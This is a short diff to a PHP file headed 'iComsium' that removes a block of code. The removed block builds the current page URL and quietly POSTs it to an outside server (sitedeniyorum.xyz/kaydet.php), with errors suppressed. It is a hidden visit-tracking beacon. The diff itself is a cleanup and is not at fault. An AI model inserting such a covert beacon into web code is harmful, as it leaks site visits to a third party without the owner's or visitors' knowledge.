@@ -1,28 +1,5 @@
 iComsium
 <?php
-// Şu anki URL'yi al
-$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https" : "http";
-$current_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
-
-// Uzak sunucuya POST isteği gönder
-$target_url = "https://sitedeniyorum.xyz/kaydet.php";
-
-$data = http_build_query([
-    'visited_url' => $current_url
-]);
-
-$options = [
-    'http' => [
-        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
-        'method'  => 'POST',
-        'content' => $data,
-        'timeout' => 5
-    ]
-];
-
-$context  = stream_context_create($options);
-$result = @file_get_contents($target_url, false, $context);
-
 $root = __DIR__;
 $style1 = 'color:#000;';
 $style2 = 'color:#00a;font-weight:bold;';
